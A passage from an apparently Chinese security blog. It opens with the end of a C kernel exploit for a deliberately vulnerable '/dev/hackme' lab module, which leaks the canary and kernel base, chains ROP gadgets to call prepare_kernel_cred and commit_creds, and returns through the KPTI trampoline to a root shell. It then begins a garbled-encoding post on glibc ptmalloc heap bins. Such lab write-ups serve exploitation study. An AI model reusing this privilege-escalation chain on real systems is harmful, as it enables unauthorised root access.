reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking canary and text base&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> buffer[<span class="number">40</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">40</span>*<span class="number">8</span>);</span><br><span class="line">    canary = buffer[<span class="number">0x10</span>];</span><br><span class="line">    addr_leak = buffer[<span class="number">38</span>];</span><br><span class="line"></span><br><span class="line">    addr_text_base = addr_leak - off_leak;</span><br><span class="line">    addr_kpti_trampoline = addr_text_base + off_kpti_trampoline;</span><br><span class="line">    addr_ksymtab = addr_text_base + off_ksymtab;</span><br><span class="line">    addr_ksymtab_commit_creds = addr_text_base + off_ksymtab_commit_creds;</span><br><span class="line">    addr_ksymtab_prepare_kernel_cred = addr_text_base + off_ksymtab_prepare_kernel_cred;</span><br><span class="line">    addr_deref_rax_pop_rbp_ret = addr_text_base + off_deref_rax_pop_rbp_ret;</span><br><span class="line">    addr_pop_rax_ret = addr_text_base + off_pop_rax_ret;</span><br><span class="line">    addr_pop_rdi_ret = addr_text_base + off_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_leak: %p\n&quot;</span>,addr_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_text_base: %p\n&quot;</span>,addr_text_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_kpti_trampoline: %p\n&quot;</span>,addr_kpti_trampoline);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab: %p\n&quot;</span>,addr_ksymtab);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_commit_creds: %p\n&quot;</span>,addr_ksymtab_commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_prepare_kernel_cred: %p\n&quot;</span>,addr_ksymtab_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_deref_rax_pop_rbp_ret: %p\n&quot;</span>,addr_deref_rax_pop_rbp_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rax_ret: %p\n&quot;</span>,addr_pop_rax_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rdi_ret: %p\n&quot;</span>,addr_pop_rdi_ret);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Leak complete\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking prepare_kernel_cred offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_prepare_kernel_cred;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_prepare_kernel_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[+] prepare_kernel_cred offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_prepare_kernel_cred = addr_ksymtab_prepare_kernel_cred - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_prepare_kernel_cred: %p\n&quot;</span>,addr_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_prepare_kernel_cred calculated\n&quot;</span>);</span><br><span class="line">    leak_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking commit_creds offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_commit_creds;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_commit_creds;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    <span class="comment">// puts(&quot;[+] commit_creds offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset,eax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_commit_creds = addr_ksymtab_commit_creds - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_commit_creds: %p\n&quot;</span>,addr_commit_creds);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_commit_creds calculated\n&quot;</span>);</span><br><span class="line">    execute_prepare_kernel_cred();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing prepare_kernel_cred&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = save_init_task_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov addr_init_task_cred,rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init task_cred address: %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_init_task_cred saved\n\n&quot;</span>);</span><br><span class="line">    execute_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing commit_creds&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = addr_init_task_cred;</span><br><span class="line">    payload[offset++] = addr_commit_creds;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = spawn_shell;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/" class="post-title-link" itemprop="url">heap bins</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-11-23 21:31:00 / Modified: 21:35:17" itemprop="dateCreated datePublished" datetime="2024-11-23T21:31:00+08:00">2024-11-23</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="çœ‹çœ‹ä½ çš„æ–Œ"><a href="#çœ‹çœ‹ä½ çš„æ–Œ" class="headerlink" title="çœ‹çœ‹ä½ çš„æ–Œ"></a>çœ‹çœ‹ä½ çš„æ–Œ</h1><h2 id="11æœˆ8æ—¥çš„æ¢¦"><a href="#11æœˆ8æ—¥çš„æ¢¦" class="headerlink" title="11æœˆ8æ—¥çš„æ¢¦"></a>11æœˆ8æ—¥çš„æ¢¦</h2><p>11.8ç¡åˆ°ä¸‹åˆ1ç‚¹æ‰é†’,åšäº†ä¸€ä¸ªç‰¹åˆ«æ²™é›•çš„æ¢¦</p>
<p>å°æ—¶å€™ä¸Šçš„å•æ‰€é•¿è¿™æ ·,ä¸¤ä¸ªé«˜å°ä¸­é—´ä¸€ä¸ªå‘é“</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/9320d00da5b65e5f8474bda8f6e876a.jpg" alt="9320d00da5b65e5f8474bda8f6e876a"></p>
<p>è¦ä¹ˆç«™åœ¨ä¸€ä¾§å°¿, è¦ä¹ˆè·¨è¹²æ‹‰</p>
<p>æˆ‘æ¢¦é‡Œä¸Šäº†ä¸ªå•æ‰€,è¿™ä¸ªå•æ‰€çš„å‘é“å¾ˆå®½,ä¸€ç±³</p>
<p>æˆ‘ä¸Šå»å‡ ä¹è¦åŠˆå‰,æœ¬æ¥ä¸æƒ³è·¨è¹²çš„</p>
<p><strong>ä½†æ˜¯æ—è¾¹å¥½å‡ ä¸ªå°æœ‹å‹</strong></p>
<p>æˆ‘ç«‹åˆ»å°±è·¨è¹²,å°æœ‹å‹å°±è·Ÿç€å­¦</p>
<p>ç„¶åå°±éƒ½æ‰ä¸‹å»äº†,ç„¶åå°æœ‹å‹å°±æººæ°´</p>
<p>æˆ‘æ­£å¥½åœ¨æ°´æµä¸Šæ¸¸</p>
<p>çˆ½æ­»æˆ‘äº†</p>
<p>æˆ‘åœ¨ä¸Šæ¸¸å¯åŠ²å„¿é€ çŸ¢</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241108150444057.png" alt="image-20241108150444057"></p>
<h2 id="æ–Œå®¶ã®æ•…äº‹"><a href="#æ–Œå®¶ã®æ•…äº‹" class="headerlink" title="æ–Œå®¶ã®æ•…äº‹"></a>æ–Œå®¶ã®æ•…äº‹</h2><p>ä¹±æ–Œ,å°æ–Œ,å¤§æ–Œæ˜¯æ–Œå®¶ä¸‰å…„å¼Ÿ,åŒå¤„ä¸€ä¸ªå±‹æªä¸‹</p>
<p>å¿«æ–Œæ˜¯å”è¾ˆå…„å¼Ÿ,è‡ªå·±å¦ä½</p>
<p>è¿™å››ä¸ªå‚»æ–Œå„è‡ªå¼€äº†ä»£é”€å¤„, è´Ÿè´£å€’å–ä¸€ç§å«åš<strong>å †å—</strong>çš„è´§ç‰©</p>
<p>æœ€åˆæ–Œå®¶æ˜¯ä¸€ç©·äºŒç™½çš„, å®¢æˆ·åªèƒ½å»<strong>å¤´å—æ‰¹å‘å¸‚åœº</strong>äº²è‡ªæ‹¿è´§</p>
<p>å®¢æˆ·ç”¨å®Œäº†çš„è´§, æ–Œå®¶é—»ç€å‘³å„¿å°±æ¥æ‹¾ç ´çƒ‚å„¿äº†</p>
<p>å¿«æ–Œæ€§å­å¾ˆæ€¥, å–œæ¬¢ç›´æ¥æŠ¢. å¿«æ–Œä¸æ»¡è¶³çš„è¯, æ˜¯è½®ä¸åˆ°æ–Œå®¶ä¸‰å…„å¼Ÿçš„</p>
<p>å‰©ä¸‹æ–Œå®¶ä¸‰å…„å¼Ÿä¸­, ä¹±æ–Œè´Ÿè´£è¿›è´§, æ‹¿å›æ¥åå’Œå¤§æ–Œå°æ–Œåˆ†è´§</p>
<p>å¿«æ–Œæ€§å­å¾ˆæ€¥, ç®¡ç†è´§ç‰©ç®€å•ç²—æš´ä½†æ˜¯é¢‡å…·æ¡ç†, ä»–æ‰¾äº†10ä¸ªæ¡©, æ¯ä¸ªæ¡©ä¸Šç”¨é“é“¾æ‹´å¤§å°ä¸€æ ·çš„è´§, æ “äº†10é•¿ä¸² </p>
<p>ä¹±æ–Œéå¸¸ä¸æ¡ç†, ä»–è‡ªå·±çš„è´§éšä¾¿ä¹±æ”¾, æ¯æ¬¡æ‰¾è´§éƒ½å¾—æ‰’ç¿»åŠå¤©, ç”¨å±±ä¸œè¯è¯´å°±æ˜¯å±‘åŒ…è›‹</p>
<p>å°æ–Œå°±æ¯”è¾ƒæ¡ç†, ä»–æŒ‰ç…§è´§ç‰©å¤§å°æŠŠè´§åˆ†æˆäº†62ä¸ªç®±å­, æ¯ä¸ªç®±å­é‡Œæ”¾å¤§å°ç›¸è¿‘çš„è´§</p>
<p>å¤§æ–Œæœ€æ¡ç†,ä»–ä¸å…‰åˆ†äº†63ä¸ªç®±å­æ”¾å¤§å°ç›¸è¿‘çš„è´§, å¦‚æœå°ç®±å­ç©ºäº†ä»–è¿˜ä¼šä»å¤§ç®±å­é‡Œæ‹¿å¤§è´§æ‹†å°ç„¶åæ”¾åˆ°å°ç®±å­</p>
<p>å› æ­¤ä¹±æ–ŒçŸ¥é“è‡ªå·±ä¸æ˜¯ç†è´§çš„æ–™å„¿, ä¼šåŠæ—¶æŠŠè´§åˆ†ç»™å¤§å°æ–Œç®¡ç†, è‡ªå·±é›†ä¸­ç²¾åŠ›è¿›è´§</p>
<p>ä½†æ˜¯ç”±äºå¿«æ–Œå–œæ¬¢æŠ¢ä¸œè¥¿, å¥½ç«¯ç«¯çš„å¤§è´§å¯èƒ½è¢«ä»–æŠ¢æˆå¥½å‡ ä¸ªå°è´§, è¿™æ—¶å€™å¦‚æœå®¢æˆ·æ¥è¦å¤§è´§, å››ä¸ªæ–Œè°ä¹Ÿæ‹¿ä¸å‡ºæ¥, ä¹Ÿå°±æ˜¯å½¢æˆäº†å¤–éƒ¨ç¢ç‰‡</p>
<p>è¿™å°±å°´å°¬äº†, ä»€ä¹ˆæ–Œå®¶å››é£èˆ</p>
<p>å› æ­¤å¿«æ–Œä¼šåœ¨æ­¤æ—¶è¢«åˆ¶è£, ä¹–ä¹–äº¤å‡ºæ‰€æœ‰è´§ç‰©ç»„æˆå¤§è´§ç»™å®¢æˆ·</p>
<p>ç„¶è€Œæœ‰ä¸€å¤©å®¢æˆ·å«Œæ–Œå®¶å››å…„å¼Ÿå¤ªé£èˆäº†, å¦æ‰¾äº†ä¸ªæ“¦è½¦æ–Œ(ä¸‹ç®€ç§°æ“¦æ–Œ)ä½œä»£ç†å•†</p>
<p>æ“¦æ–Œæ¯”å¿«æ–Œè¿˜æ€¥, æ€¥å¾—è·ŸğŸä¸€æ ·, å¿«æ–Œéƒ½æŠ¢ä¸è¿‡ä»–</p>
<p>è¿™ä¸€ä¸‹å­è€æ–Œå®¶çš„ç”Ÿæ„æƒ¨æ·¡äº†è®¸å¤š</p>
<p><strong>æ ¼ç«‹åŒ—å…‹</strong>å¸å›½å¸å–äº†å¿«æ–Œä¹±æŠ¢çš„æ•™è®­, æäº†ä¸ªåå„æ–­, å‰ä¸ƒä¸ªè´§è®©ç»™æ“¦è½¦æ–Œ, ä¹‹åçš„è´§è¿˜æ˜¯ç”±è€æ–Œå®¶ç»è¥</p>
<p>å›¾å·çš„pwncollege</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png" alt="malloc beyond tcache"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png" alt="free beyond tcache"></p>
<p>æœ¬æ–‡å‚è€ƒGlibc2.35</p>
<h2 id="meta-meta-data"><a href="#meta-meta-data" class="headerlink" title="meta-meta-data"></a>meta-meta-data</h2><p>æœ¬èŠ‚ä»‹ç»å…ƒæ•°æ®çš„å…ƒæ•°æ®,ä¹Ÿå°±æ˜¯æ•´ä¸ª<code>ptmalloc</code>çš„å®è§‚ç»“æ„,ä¹Ÿå°±æ˜¯æ–Œã®å®¶</p>
<p>æ›´å…·ä½“çš„è¯´å°±æ˜¯å¦‚ä¸‹ä¸¤ä¸ªç»“æ„</p>
<table>
<thead>
<tr>
<th>ç»“æ„ä½“</th>
<th>ä½œç”¨</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>malloc_state</td>
<td>åˆ†é…åŒº,ç®¡ç†fastbins,binsç­‰å…ƒæ•°æ®</td>
<td><strong>é‡è¦</strong></td>
</tr>
<tr>
<td>malloc_par</td>
<td>åˆ†é…åŒºé…ç½®æ–‡ä»¶,è®°å½•tcacheæ¡¶å­å®¹é‡,æœ€å¤§å—å¤§å°ç­‰é…ç½®ä¿¡æ¯</td>
<td>ä¸æ˜¯å¾ˆé‡è¦</td>
</tr>
</tbody></table>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p><code>malloc_state</code>æ˜¯<code>ptmalloc</code>ä¸­çš„å®è§‚å…ƒæ•°æ®ç»“æ„, å…¶å¯¹è±¡è¢«ç§°ä¸ºâ€œåˆ†é…åŒºâ€,æ¯”å¦‚<code>main_arena</code>å°±æ˜¯<strong>ä¸»åˆ†é…åŒº</strong></p>
<p>åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­,å¯èƒ½å­˜åœ¨å¤šä¸ªåˆ†é…åŒº,ä»¥åº”å¯¹å¹¶å‘çš„åˆ†é…è¯·æ±‚</p>
<p>ç®¡ç†ç€å„ç§<code>bins</code>çš„å…ƒæ•°æ®ä¿¡æ¯,æ¯”å¦‚é“¾è¡¨é™„åŠ å¤´èŠ‚ç‚¹çš„ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];			<span class="comment">//fastbins</span></span><br><span class="line"></span><br><span class="line">    mchunkptr top;								<span class="comment">//topchunk</span></span><br><span class="line"></span><br><span class="line">    mchunkptr last_remainder;					<span class="comment">//æœ€è¿‘ä¸€æ¬¡åˆ†é…å‰©ä¸‹çš„å †å—æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];			</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>					<span class="comment">//ä¸‹ä¸€ä¸ªmalloc_state</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bins[0]</span><br><span class="line">bins[1] =&gt; unsorted bin</span><br><span class="line">bins[2:63] =&gt; small bins</span><br><span class="line">bins[64:126] =&gt; large bins</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>fastbins</code>æ˜¯<code>bins</code>çš„ç¼“å­˜,ç±»ä¼¼äº<code>tcache</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸»åˆ†é…åŒº(<code>main_arena</code>)æ˜¯<code>malloc_state</code>çš„ä¸€ä¸ªå®ä¾‹,æ˜¯ä¸€ä¸ª<code>glibc</code>çš„<code>static</code>å¯¹è±¡</p>
